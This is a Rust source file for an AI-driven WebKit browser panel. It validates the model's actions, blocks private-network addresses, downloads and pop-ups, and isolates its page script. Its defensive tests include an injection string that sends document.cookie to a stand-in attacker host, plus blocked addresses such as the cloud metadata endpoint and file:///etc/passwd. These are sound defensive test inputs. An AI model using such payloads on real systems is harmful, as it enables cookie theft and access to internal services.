//! Vikram's agent browser: a WebKit child webview the model drives.
//!
//! In the app it is a panel in the main window that the person watches and can
//! take over; for the CLI the same binary runs it in a hidden window
//! (`--browser-helper`), answering JSON lines on stdio. Either way it has its own
//! non-persistent data store, refuses non-web schemes and private network
//! addresses, never downloads, never opens windows, and runs Vikram's page
//! script in a separate script world the page cannot reach.

use base64::Engine;
use serde_json::{json, Value};
use std::{
    io::{BufRead, Read, Write},
    net::{Ipv4Addr, Ipv6Addr},
    sync::{Arc, Mutex},
    time::{Duration, Instant},
};
use tauri::{
    utils::config::BackgroundThrottlingPolicy, webview::NewWindowResponse,
    webview::PageLoadEvent, AppHandle, Emitter, LogicalPosition, LogicalSize, Manager, Url,
    Webview, WebviewBuilder, WebviewUrl,
};
use tokio::sync::oneshot;

const SCRIPT: &str = include_str!("browser.js");
const LABEL: &str = "browser";
pub const HELPER_WINDOW: &str = "browser-host";
const MAX_TYPED: usize = 2_000;
const MAX_LINE: usize = 1024 * 1024;
const SHOT_WIDTH: f64 = 1024.0;
const SCRIPT_TIMEOUT: Duration = Duration::from_secs(10);
const LOAD_TIMEOUT: Duration = Duration::from_secs(20);
const RULES_ID: &str = "vikram-private-network";
const BLOCKED_SUFFIXES: &[&str] = &[
    ".localhost",
    ".local",
    ".internal",
    ".lan",
    ".home",
    ".home.arpa",
    ".test",
];
// WebKit content blocker URL filters (no alternation): private and local hosts
// are blocked for every request a page makes, not only for navigations.
const PRIVATE_FILTERS: &[&str] = &[
    r"^[a-z]+://[^./:]+[:/]",
    r"^[a-z]+://[^/]*\.localhost[:/]",
    r"^[a-z]+://[^/]*\.local[:/]",
    r"^[a-z]+://[^/]*\.internal[:/]",
    r"^[a-z]+://[^/]*\.lan[:/]",
    r"^[a-z]+://[^/]*\.home[:/]",
    r"^[a-z]+://[^/]*\.home\.arpa[:/]",
    r"^[a-z]+://[^/]*\.test[:/]",
    r"^[a-z]+://0\.",
    r"^[a-z]+://10\.",
    r"^[a-z]+://127\.",
    r"^[a-z]+://169\.254\.",
    r"^[a-z]+://172\.1[6-9]\.",
    r"^[a-z]+://172\.2[0-9]\.",
    r"^[a-z]+://172\.3[01]\.",
    r"^[a-z]+://192\.168\.",
    r"^[a-z]+://100\.6[4-9]\.",
    r"^[a-z]+://100\.[7-9][0-9]\.",
    r"^[a-z]+://100\.1[01][0-9]\.",
    r"^[a-z]+://100\.12[0-7]\.",
    r"^[a-z]+://\[",
];

#[derive(Clone, Copy, Debug, PartialEq)]
pub struct Bounds {
    pub x: f64,
    pub y: f64,
    pub width: f64,
    pub height: f64,
}

#[derive(Default)]
struct State {
    webview: Option<Webview>,
    bounds: Option<Bounds>,
    hidden: bool,
    loads: u64,
    url: String,
    title: String,
    loading: bool,
    notices: Vec<String>,
}

/// The one browser this process hosts.
#[derive(Default)]
pub struct Browser {
    state: Arc<Mutex<State>>,
    // Serializes actions (and creating the webview) across tasks.
    busy: tokio::sync::Mutex<()>,
}

/// Whether the browser may navigate to `url`: public web pages, plus the blank
/// and inline documents pages use for frames. Never local files, app schemes,
/// or hosts on this Mac or its networks.
pub fn allowed(url: &Url) -> bool {
    match url.scheme() {
        "about" => matches!(url.as_str(), "about:blank" | "about:srcdoc"),
        "blob" | "data" => true,
        "http" | "https" => public_host(url),
        _ => false,
    }
}

fn public_host(url: &Url) -> bool {
    if !url.username().is_empty() || url.password().is_some() {
        return false;
    }
    match url.host() {
        Some(url::Host::Domain(name)) => {
            let name = name.trim_end_matches('.').to_ascii_lowercase();
            name.contains('.')
                && !BLOCKED_SUFFIXES.iter().any(|suffix| name.ends_with(suffix))
        }
        Some(url::Host::Ipv4(ip)) => global_v4(ip),
        Some(url::Host::Ipv6(ip)) => global_v6(ip),
        None => false,
    }
}

fn global_v4(ip: Ipv4Addr) -> bool {
    let [a, b, ..] = ip.octets();
    !(ip.is_private()
        || ip.is_loopback()
        || ip.is_link_local()
        || ip.is_broadcast()
        || ip.is_documentation()
        || ip.is_unspecified()
        || ip.is_multicast()
        || a == 0
        || a >= 240
        || (a == 100 && (64..128).contains(&b))
        || (a == 198 && (b == 18 || b == 19)))
}

fn global_v6(ip: Ipv6Addr) -> bool {
    if let Some(v4) = ip.to_ipv4_mapped() {
        return global_v4(v4);
    }
    let first = ip.segments()[0];
    !(ip.is_loopback()
        || ip.is_unspecified()
        || ip.is_multicast()
        || (first & 0xfe00) == 0xfc00
        || (first & 0xffc0) == 0xfe80
        || (first == 0x2001 && ip.segments()[1] == 0x0db8))
}

/// The content blocker that keeps pages from reaching private addresses.
pub fn private_rules() -> String {
    Value::Array(
        PRIVATE_FILTERS
            .iter()
            .map(|filter| json!({"trigger": {"url-filter": filter}, "action": {"type": "block"}}))
            .collect(),
    )
    .to_string()
}

/// One validated action. Everything the engine runs comes from this enum, so a
/// malformed or unexpected call never reaches the page.
#[derive(Debug, PartialEq)]
pub enum Action {
    Open(Url),
    Click { element: u64, approved: bool },
    Type { element: u64, text: String, submit: bool, approved: bool },
    Scroll { up: bool },
    Back,
    Look,
}

pub fn parse(call: &Value) -> Result<(Action, bool), String> {
    let invalid = || "The browser received an invalid action.".to_string();
    let object = call.as_object().ok_or_else(invalid)?;
    let flag = |key: &str| -> Result<bool, String> {
        match object.get(key) {
            None => Ok(false),
            Some(Value::Bool(value)) => Ok(*value),
            _ => Err(invalid()),
        }
    };
    let element = || -> Result<u64, String> {
        object
            .get("element")
            .and_then(Value::as_u64)
            .filter(|n| (1..=100_000).contains(n))
            .ok_or_else(invalid)
    };
    let screenshot = flag("screenshot")?;
    let action = match object.get("action").and_then(Value::as_str) {
        Some("open") => {
            let url = object
                .get("url")
                .and_then(Value::as_str)
                .filter(|url| url.len() <= 2048)
                .and_then(|url| Url::parse(url).ok())
                .ok_or_else(invalid)?;
            if !matches!(url.scheme(), "http" | "https") || !allowed(&url) {
                return Err("That address is blocked: only public http and https pages open in Vikram's browser.".into());
            }
            Action::Open(url)
        }
        Some("click") => Action::Click {
            element: element()?,
            approved: flag("approved")?,
        },
        Some("type") => {
            let text = object
                .get("text")
                .and_then(Value::as_str)
                .filter(|text| text.chars().count() <= MAX_TYPED)
                .ok_or_else(invalid)?;
            Action::Type {
                element: element()?,
                text: text.to_string(),
                submit: flag("submit")?,
                approved: flag("approved")?,
            }
        }
        Some("scroll") => match object.get("direction").and_then(Value::as_str) {
            Some("down") | None => Action::Scroll { up: false },
            Some("up") => Action::Scroll { up: true },
            _ => return Err(invalid()),
        },
        Some("back") => Action::Back,
        Some("look") => Action::Look,
        _ => return Err(invalid()),
    };
    Ok((action, screenshot))
}

fn failure(error: impl Into<String>) -> Value {
    json!({"ok": false, "error": error.into()})
}

fn bounded(text: &str, limit: usize) -> String {
    text.chars().take(limit).collect()
}

fn rect(bounds: Bounds, (left, top): (f64, f64)) -> tauri::Rect {
    tauri::Rect {
        position: LogicalPosition::new(bounds.x + left, bounds.y + top).into(),
        size: LogicalSize::new(bounds.width, bounds.height).into(),
    }
}

impl Browser {
    /// Place the panel where the window shows it. The window reports the area
    /// in its chat page's coordinates, which start where the chat webview does.
    pub async fn set_bounds(&self, app: &AppHandle, bounds: Bounds) {
        let webview = {
            let mut state = self.state.lock().unwrap();
            state.bounds = Some(bounds);
            state.webview.clone()
        };
        if let Some(webview) = webview {
            let origin = native::chat_origin(app).await;
            let _ = webview.set_bounds(rect(bounds, origin));
        }
    }

    /// Hide the panel under the app's own dialogs; the page keeps running.
    pub fn set_hidden(&self, hidden: bool) {
        let mut state = self.state.lock().unwrap();
        state.hidden = hidden;
        if let Some(webview) = &state.webview {
            let _ = if hidden { webview.hide() } else { webview.show() };
        }
    }

    /// Close the browser; its private session ends with it.
    pub fn close(&self, app: &AppHandle) {
        let webview = {
            let mut state = self.state.lock().unwrap();
            state.url.clear();
            state.title.clear();
            state.loading = false;
            state.notices.clear();
            state.webview.take()
        };
        if let Some(webview) = webview {
            let _ = webview.close();
        }
        emit(app, &self.state);
    }

    pub fn snapshot(&self) -> Value {
        describe(&self.state.lock().unwrap())
    }

    async fn ensure(&self, app: &AppHandle, window: &str) -> Result<Webview, String> {
        if let Some(webview) = self.state.lock().unwrap().webview.clone() {
            return Ok(webview);
        }
        let host = app
            .get_window(window)
            .ok_or("The browser window is unavailable.")?;
        let bounds = self.state.lock().unwrap().bounds.unwrap_or_else(|| {
            // Until the window reports the panel, use the right part of it.
            let scale = host.scale_factor().unwrap_or(1.0);
            let size = host
                .inner_size()
                .map(|s| s.to_logical::<f64>(scale))
                .unwrap_or(LogicalSize::new(1200.0, 800.0));
            Bounds {
                x: size.width * 0.55,
                y: 52.0,
                width: size.width * 0.45,
                height: (size.height - 52.0).max(200.0),
            }
        });
        let loads = self.state.clone();
        let titles = self.state.clone();
        let downloads = self.state.clone();
        let popups = self.state.clone();
        let blocked = self.state.clone();
        let (load_app, title_app) = (app.clone(), app.clone());
        let builder = WebviewBuilder::new(
            LABEL,
            WebviewUrl::External(Url::parse("about:blank").unwrap()),
        )
        .incognito(true)
        .devtools(false)
        .background_throttling(BackgroundThrottlingPolicy::Disabled)
        .on_navigation(move |url| {
            let allow = allowed(url);
            if !allow {
                note(&blocked, format!("A link to a blocked address was not opened ({}).", bounded(url.scheme(), 20)));
            }
            allow
        })
        .on_page_load(move |_, payload| {
            {
                let mut state = loads.lock().unwrap();
                state.url = bounded(payload.url().as_str(), 2048);
                match payload.event() {
                    PageLoadEvent::Started => {
                        state.loads += 1;
                        state.loading = true;
                    }
                    PageLoadEvent::Finished => state.loading = false,
                }
            }
            emit(&load_app, &loads);
        })
        .on_document_title_changed(move |_, title| {
            titles.lock().unwrap().title = bounded(&title, 300);
            emit(&title_app, &titles);
        })
        .on_download(move |_, event| {
            if let tauri::webview::DownloadEvent::Requested { .. } = event {
                note(&downloads, "A download was blocked: Vikram's browser never saves files.".into());
            }
            false
        })
        .on_new_window(move |_, _| {
            note(&popups, "A new window or pop-up was blocked.".into());
            NewWindowResponse::Deny
        });
        let placed = rect(bounds, native::chat_origin(app).await);
        let webview = host
            .add_child(builder, placed.position, placed.size)
            .map_err(|_| "The browser could not start.")?;
        if let Err(error) = native::block_private_network(&webview).await {
            let _ = webview.close();
            return Err(error);
        }
        let hidden = {
            let mut state = self.state.lock().unwrap();
            state.webview = Some(webview.clone());
            state.hidden
        };
        if hidden {
            let _ = webview.hide();
        }
        emit(app, &self.state);
        Ok(webview)
    }

    async fn settle(&self, webview: &Webview, loads: u64, navigating: bool) {
        // A click may or may not navigate: give a load a moment to start, then
        // wait for it (or a failure) to finish, and let the page's scripts render.
        let began = Instant::now();
        let start_window = Duration::from_millis(if navigating { 2_000 } else { 700 });
        loop {
            let started = self.state.lock().unwrap().loads > loads;
            let loading = native::is_loading(webview).await;
            if (started || loading) && !loading {
                break;
            }
            if !started && !loading && began.elapsed() > start_window {
                break;
            }
            if began.elapsed() > LOAD_TIMEOUT {
                self.note("The page was still loading; this is what had appeared.");
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        tokio::time::sleep(Duration::from_millis(300)).await;
    }

    fn note(&self, text: &str) {
        note(&self.state, text.to_string());
    }

    async fn observe(&self, webview: &Webview, screenshot: bool) -> Result<Value, String> {
        let mut page = native::script(webview, "observe()").await?;
        let notices: Vec<Value> = std::mem::take(&mut self.state.lock().unwrap().notices)
            .into_iter()
            .map(Value::String)
            .collect();
        if let Some(list) = page.get_mut("notices").and_then(Value::as_array_mut) {
            list.splice(0..0, notices);
            list.truncate(10);
        }
        let mut result = json!({"ok": true, "page": page});
        if screenshot {
            if let Some(image) = native::screenshot(webview, SHOT_WIDTH).await {
                result["screenshot"] = Value::String(
                    base64::engine::general_purpose::STANDARD.encode(image),
                );
            }
        }
        Ok(result)
    }

    /// Run one action and describe the page afterwards, as `EngineResult` JSON.
    pub async fn act(&self, app: &AppHandle, window: &str, call: Value) -> Value {
        let (action, screenshot) = match parse(&call) {
            Ok(parsed) => parsed,
            Err(error) => return failure(error),
        };
        let _busy = self.busy.lock().await;
        let webview = match self.ensure(app, window).await {
            Ok(webview) => webview,
            Err(error) => return failure(error),
        };
        match self.run(&webview, action, screenshot).await {
            Ok(result) => result,
            Err(error) => {
                // A failed action still shows where the browser is, when it can.
                let mut result = failure(error);
                if let Ok(page) = self.observe(&webview, false).await {
                    result["page"] = page["page"].clone();
                }
                result
            }
        }
    }

    async fn run(&self, webview: &Webview, action: Action, screenshot: bool) -> Result<Value, String> {
        let loads = self.state.lock().unwrap().loads;
        let mut opened = None;
        let (outcome, navigating) = match &action {
            Action::Open(url) => {
                // Not `webview.url()`: wry panics on a webview that has loaded nothing.
                let before = Url::parse(&self.state.lock().unwrap().url).ok();
                webview
                    .navigate(url.clone())
                    .map_err(|_| "The page could not be opened.")?;
                self.settle(webview, loads, true).await;
                opened = Some((before, url.clone()));
                (json!({"status": "done"}), false)
            }
            Action::Click { element, approved } => (
                native::script(webview, &format!("click({element}, {approved})")).await?,
                true,
            ),
            Action::Type { element, text, submit, approved } => {
                let text = serde_json::to_string(text).map_err(|_| "Invalid text.")?;
                (
                    native::script(webview, &format!("type({element}, {text}, {submit}, {approved})")).await?,
                    *submit,
                )
            }
            Action::Scroll { up } => {
                let direction = if *up { "up" } else { "down" };
                (native::script(webview, &format!("scroll({direction:?})")).await?, false)
            }
            Action::Back => (native::script(webview, "back()").await?, true),
            Action::Look => (json!({"status": "done"}), false),
        };
        let target = outcome.get("target").and_then(Value::as_str).map(|t| bounded(t, 280));
        match outcome.get("status").and_then(Value::as_str) {
            Some("done") => {}
            Some("approval") => {
                let page = json!({
                    "url": bounded(outcome.get("url").and_then(Value::as_str).unwrap_or(""), 2048),
                    "title": bounded(outcome.get("title").and_then(Value::as_str).unwrap_or(""), 300),
                });
                return Ok(json!({
                    "ok": false,
                    "approval": outcome.get("approval").cloned().unwrap_or(Value::Null),
                    "target": target,
                    "page": page,
                }));
            }
            Some("refused") => {
                let mut result = self.observe(webview, false).await?;
                result["ok"] = Value::Bool(false);
                result["refused"] = outcome.get("error").cloned().unwrap_or(Value::Null);
                result["target"] = json!(target);
                return Ok(result);
            }
            _ => {
                let error = outcome
                    .get("error")
                    .and_then(Value::as_str)
                    .unwrap_or("The action failed.");
                return Err(bounded(error, 900));
            }
        }
        if let Some(notice) = outcome.get("notice").and_then(Value::as_str) {
            self.note(notice);
        }
        if !matches!(action, Action::Open(_) | Action::Look) {
            self.settle(webview, loads, navigating).await;
        }
        let mut result = self.observe(webview, screenshot).await?;
        if let Some((before, wanted)) = opened {
            // WebKit keeps the previous page when a load fails.
            let now = result["page"]["url"].as_str().and_then(|url| Url::parse(url).ok());
            if now.is_some() && now == before && before.as_ref() != Some(&wanted) {
                if let Some(notices) = result["page"]["notices"].as_array_mut() {
                    notices.insert(
                        0,
                        json!("The page did not open: it may be unreachable, blocked, or too slow."),
                    );
                }
            }
        }
        if let Some(target) = target {
            result["target"] = Value::String(target);
        }
        Ok(result)
    }
}

fn note(state: &Mutex<State>, text: String) {
    let mut state = state.lock().unwrap();
    if state.notices.len() < 6 && !state.notices.contains(&text) {
        state.notices.push(text);
    }
}

fn describe(state: &State) -> Value {
    json!({
        "open": state.webview.is_some(),
        "url": state.url,
        "title": state.title,
        "loading": state.loading,
    })
}

fn emit(app: &AppHandle, state: &Mutex<State>) {
    let payload = describe(&state.lock().unwrap());
    let _ = app.emit("browser", payload);
}

/// The CLI's hidden browser: JSON lines in, `{"id", "result"}` lines out, until
/// input closes. The process never shows a window or a Dock icon.
pub fn helper(mut context: tauri::Context<tauri::Wry>) {
    context.config_mut().app.windows.clear();
    let builder = tauri::Builder::default()
        .manage(Browser::default())
        .setup(|app| {
            tauri::window::WindowBuilder::new(app, HELPER_WINDOW)
                .visible(false)
                .focused(false)
                .inner_size(1280.0, 900.0)
                .build()?;
            app.state::<Browser>().state.lock().unwrap().bounds = Some(Bounds {
                x: 0.0,
                y: 0.0,
                width: 1280.0,
                height: 900.0,
            });
            let handle = app.handle().clone();
            std::thread::spawn(move || serve(handle));
            Ok(())
        });
    let Ok(mut app) = builder.build(context) else {
        std::process::exit(1);
    };
    app.set_activation_policy(tauri::ActivationPolicy::Prohibited);
    app.run(|_, _| {});
}

fn serve(app: AppHandle) {
    let output = Arc::new(Mutex::new(std::io::stdout()));
    {
        // The CLI waits for this line, so an app without helper mode is caught.
        let mut output = output.lock().unwrap();
        let _ = output.write_all(b"{\"ready\":true}\n");
        let _ = output.flush();
    }
    let mut input = std::io::stdin().lock();
    loop {
        let mut line = String::new();
        match (&mut input).take(MAX_LINE as u64 + 1).read_line(&mut line) {
            Ok(0) | Err(_) => break,
            Ok(_) if line.len() > MAX_LINE || !line.ends_with('\n') => break,
            Ok(_) => {}
        }
        let Ok(message) = serde_json::from_str::<Value>(&line) else {
            continue;
        };
        let id = message.get("id").cloned().unwrap_or(Value::Null);
        let call = message.get("call").cloned().unwrap_or(Value::Null);
        let (app, output) = (app.clone(), output.clone());
        tauri::async_runtime::spawn(async move {
            let result = app.state::<Browser>().act(&app, HELPER_WINDOW, call).await;
            let line = json!({"id": id, "result": result}).to_string() + "\n";
            let mut output = output.lock().unwrap();
            let _ = output.write_all(line.as_bytes());
            let _ = output.flush();
        });
    }
    // The CLI is done: the private session ends with this process.
    app.exit(0);
}

/// WebKit calls, made on the main thread through Tauri's `with_webview`.
mod native {
    use super::*;
    use block2::RcBlock;
    use objc2::{rc::Retained, runtime::AnyObject, MainThreadMarker};
    use objc2_app_kit::{NSBitmapImageFileType, NSBitmapImageRep, NSImage, NSImageCompressionFactor};
    use objc2_foundation::{NSDictionary, NSError, NSNumber, NSString};
    use objc2_web_kit::{
        WKContentRuleList, WKContentRuleListStore, WKContentWorld, WKSnapshotConfiguration,
        WKUserContentController, WKWebView,
    };
    use std::cell::Cell;

    fn reply<T>(sender: oneshot::Sender<T>) -> Cell<Option<oneshot::Sender<T>>> {
        Cell::new(Some(sender))
    }

    thread_local! {
        // WebKit discards a script world, with the page script's element numbers,
        // once nothing holds it; this one lives as long as the process.
        static WORLD: std::cell::OnceCell<Retained<WKContentWorld>> = const { std::cell::OnceCell::new() };
    }

    fn world(mtm: MainThreadMarker) -> Retained<WKContentWorld> {
        WORLD.with(|world| {
            world
                .get_or_init(|| unsafe {
                    WKContentWorld::worldWithName(&NSString::from_str("vikram"), mtm)
                })
                .clone()
        })
    }

    /// Run Vikram's page script in its own script world and parse what it returns.
    pub async fn script(webview: &Webview, call: &str) -> Result<Value, String> {
        let body = format!("{SCRIPT}\nreturn JSON.stringify(await vikram.{call});");
        let (sender, receiver) = oneshot::channel::<Result<String, String>>();
        webview
            .with_webview(move |platform| unsafe {
                let Some(mtm) = MainThreadMarker::new() else {
                    return;
                };
                let view = &*(platform.inner() as *const WKWebView);
                let world = world(mtm);
                let sender = reply(sender);
                let done = RcBlock::new(move |result: *mut AnyObject, error: *mut NSError| {
                    let outcome = if let Some(error) = error.as_ref() {
                        Err(format!(
                            "The page script failed ({}).",
                            bounded(&error.localizedDescription().to_string(), 200)
                        ))
                    } else if let Some(text) =
                        result.as_ref().and_then(|value| value.downcast_ref::<NSString>())
                    {
                        Ok(text.to_string())
                    } else {
                        Err("The page script returned nothing.".to_string())
                    };
                    if let Some(sender) = sender.take() {
                        let _ = sender.send(outcome);
                    }
                });
                view.callAsyncJavaScript_arguments_inFrame_inContentWorld_completionHandler(
                    &NSString::from_str(&body),
                    None,
                    None,
                    &world,
                    Some(&done),
                );
            })
            .map_err(|_| "The browser is unavailable.".to_string())?;
        match tokio::time::timeout(SCRIPT_TIMEOUT, receiver).await {
            Ok(Ok(Ok(text))) => serde_json::from_str(&text)
                .map_err(|_| "The page script returned an unreadable result.".to_string()),
            Ok(Ok(Err(error))) => Err(error),
            Ok(Err(_)) => Err("The browser closed.".to_string()),
            Err(_) => Err("The page did not respond in time.".to_string()),
        }
    }

    /// Where the app's chat page starts inside the view that also holds the
    /// browser panel, in points (none in the CLI helper, which has no chat).
    ///
    /// The window's content view runs under the title bar, and WebKit insets
    /// the chat page below it, so the page starts where the chat webview starts
    /// or where the title bar ends, whichever is lower.
    pub async fn chat_origin(app: &AppHandle) -> (f64, f64) {
        let Some(chat) = app.get_webview("main") else {
            return (0.0, 0.0);
        };
        let (sender, receiver) = oneshot::channel();
        let sent = chat.with_webview(move |platform| unsafe {
            let view = &*(platform.inner() as *const WKWebView);
            let origin = view.superview().map_or((0.0, 0.0), |parent| {
                let frame = view.frame();
                let height = parent.frame().size.height;
                let flipped = parent.isFlipped();
                // Distances from the top of the parent view.
                let top = if flipped {
                    frame.origin.y
                } else {
                    height - frame.origin.y - frame.size.height
                };
                let title_bar = view.window().map_or(0.0, |window| {
                    let layout = window.contentLayoutRect();
                    (height - (layout.origin.y + layout.size.height)).max(0.0)
                });
                (frame.origin.x, top.max(title_bar))
            });
            let _ = sender.send(origin);
        });
        if sent.is_err() {
            return (0.0, 0.0);
        }
        tokio::time::timeout(Duration::from_secs(2), receiver)
            .await
            .ok()
            .and_then(Result::ok)
            .unwrap_or((0.0, 0.0))
    }

    pub async fn is_loading(webview: &Webview) -> bool {
        let (sender, receiver) = oneshot::channel();
        let sent = webview.with_webview(move |platform| unsafe {
            let view = &*(platform.inner() as *const WKWebView);
            let _ = sender.send(view.isLoading());
        });
        sent.is_ok()
            && tokio::time::timeout(Duration::from_secs(2), receiver)
                .await
                .ok()
                .and_then(Result::ok)
                .unwrap_or(false)
    }

    /// The visible part of the page as a JPEG about `width` pixels wide.
    pub async fn screenshot(webview: &Webview, width: f64) -> Option<Vec<u8>> {
        let (sender, receiver) = oneshot::channel::<Option<Vec<u8>>>();
        webview
            .with_webview(move |platform| unsafe {
                let Some(mtm) = MainThreadMarker::new() else {
                    return;
                };
                let view = &*(platform.inner() as *const WKWebView);
                let scale = view.window().map(|w| w.backingScaleFactor()).unwrap_or(2.0);
                let config = WKSnapshotConfiguration::new(mtm);
                config.setSnapshotWidth(Some(&NSNumber::new_f64(width / scale.max(1.0))));
                let sender = reply(sender);
                let done = RcBlock::new(move |image: *mut NSImage, _error: *mut NSError| {
                    let jpeg = image.as_ref().and_then(|image| jpeg(image));
                    if let Some(sender) = sender.take() {
                        let _ = sender.send(jpeg);
                    }
                });
                view.takeSnapshotWithConfiguration_completionHandler(Some(&config), &done);
            })
            .ok()?;
        tokio::time::timeout(Duration::from_secs(5), receiver)
            .await
            .ok()?
            .ok()?
    }

    unsafe fn jpeg(image: &NSImage) -> Option<Vec<u8>> {
        let tiff = image.TIFFRepresentation()?;
        let bitmap = NSBitmapImageRep::imageRepWithData(&tiff)?;
        let quality = NSNumber::new_f64(0.6);
        let quality: &AnyObject = &quality;
        let properties =
            NSDictionary::<NSString, AnyObject>::from_slices(&[NSImageCompressionFactor], &[quality]);
        let data =
            bitmap.representationUsingType_properties(NSBitmapImageFileType::JPEG, &properties)?;
        Some(data.to_vec())
    }

    /// Install the private-network content blocker before the first page loads;
    /// without it the browser does not start.
    pub async fn block_private_network(webview: &Webview) -> Result<(), String> {
        let rules = private_rules();
        let (sender, receiver) = oneshot::channel::<bool>();
        webview
            .with_webview(move |platform| unsafe {
                let Some(mtm) = MainThreadMarker::new() else {
                    return;
                };
                let Some(store) = WKContentRuleListStore::defaultStore(mtm) else {
                    return;
                };
                let Some(controller) =
                    Retained::retain(platform.controller() as *mut WKUserContentController)
                else {
                    return;
                };
                let sender = reply(sender);
                let done = RcBlock::new(move |list: *mut WKContentRuleList, _error: *mut NSError| {
                    let installed = match list.as_ref() {
                        Some(list) => {
                            controller.addContentRuleList(list);
                            true
                        }
                        None => false,
                    };
                    if let Some(sender) = sender.take() {
                        let _ = sender.send(installed);
                    }
                });
                store.compileContentRuleListForIdentifier_encodedContentRuleList_completionHandler(
                    Some(&NSString::from_str(RULES_ID)),
                    Some(&NSString::from_str(&rules)),
                    Some(&done),
                );
            })
            .map_err(|_| "The browser could not start.".to_string())?;
        match tokio::time::timeout(Duration::from_secs(10), receiver).await {
            Ok(Ok(true)) => Ok(()),
            _ => Err("The browser's network protection could not start, so the browser stays closed.".into()),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn url(text: &str) -> Url {
        Url::parse(text).unwrap()
    }

    #[test]
    fn only_public_web_pages_are_allowed() {
        for ok in [
            "https://example.com/",
            "http://news.example.org/a?b=c",
            "https://8.8.8.8/",
            "https://[2606:4700::1111]/",
            "about:blank",
            "about:srcdoc",
            "blob:https://example.com/0a1b",
            "data:text/html,hi",
        ] {
            assert!(allowed(&url(ok)), "{ok}");
        }
        for blocked in [
            "http://localhost:11434/api/tags",
            "http://LOCALHOST./",
            "http://router/",
            "http://printer.local/",
            "http://app.localhost:1420/",
            "http://nas.home.arpa/",
            "http://127.0.0.1:8080/",
            "http://2130706433/",
            "http://0x7f.1/",
            "http://10.0.0.1/",
            "http://172.16.5.4/",
            "http://192.168.1.1/",
            "http://169.254.169.254/latest/meta-data/",
            "http://100.101.102.103/",
            "http://[::1]/",
            "http://[fd00::1]/",
            "http://[fe80::1]/",
            "http://[::ffff:192.168.1.1]/",
            "https://user:pass@example.com/",
            "file:///etc/passwd",
            "tauri://localhost/",
            "ipc://localhost/",
            "mailto:a@example.com",
            "javascript:alert(1)",
            "about:config",
        ] {
            assert!(!allowed(&url(blocked)), "{blocked}");
        }
    }

    #[test]
    fn content_rules_cover_private_hosts_without_alternation() {
        let rules: Value = serde_json::from_str(&private_rules()).unwrap();
        let rules = rules.as_array().unwrap();
        assert_eq!(rules.len(), PRIVATE_FILTERS.len());
        for rule in rules {
            assert_eq!(rule["action"]["type"], "block");
            let filter = rule["trigger"]["url-filter"].as_str().unwrap();
            // WebKit content blockers reject disjunctions.
            assert!(!filter.contains('|'), "{filter}");
            assert!(filter.starts_with("^[a-z]+://"), "{filter}");
        }
    }

    #[test]
    fn actions_are_validated_before_they_reach_the_page() {
        let (open, shot) = parse(&json!({"action": "open", "url": "https://example.com/", "screenshot": true})).unwrap();
        assert_eq!(open, Action::Open(url("https://example.com/")));
        assert!(shot);
        assert_eq!(
            parse(&json!({"id": "b1", "action": "type", "element": 3, "text": "kettle", "submit": true})).unwrap().0,
            Action::Type { element: 3, text: "kettle".into(), submit: true, approved: false }
        );
        assert_eq!(
            parse(&json!({"action": "scroll", "direction": "up"})).unwrap().0,
            Action::Scroll { up: true }
        );
        for bad in [
            json!(null),
            json!({"action": "eval", "script": "alert(1)"}),
            json!({"action": "click"}),
            json!({"action": "click", "element": 0}),
            json!({"action": "click", "element": "3"}),
            json!({"action": "click", "element": 3, "approved": "yes"}),
            json!({"action": "type", "element": 3, "text": "x".repeat(2001)}),
            json!({"action": "scroll", "direction": "left"}),
            json!({"action": "open", "url": "http://192.168.1.1/"}),
            json!({"action": "open", "url": "about:blank"}),
            json!({"action": "open", "url": "file:///etc/hosts"}),
        ] {
            assert!(parse(&bad).is_err(), "{bad}");
        }
    }

    #[test]
    fn typed_text_reaches_the_script_only_as_a_json_literal() {
        let text = "\"); fetch('https://evil.example/' + document.cookie); (\"\u{2028}";
        let literal = serde_json::to_string(text).unwrap();
        let call = format!("type(2, {literal}, false, false)");
        assert!(call.starts_with("type(2, \""));
        assert_eq!(serde_json::from_str::<String>(&literal).unwrap(), text);
    }
}
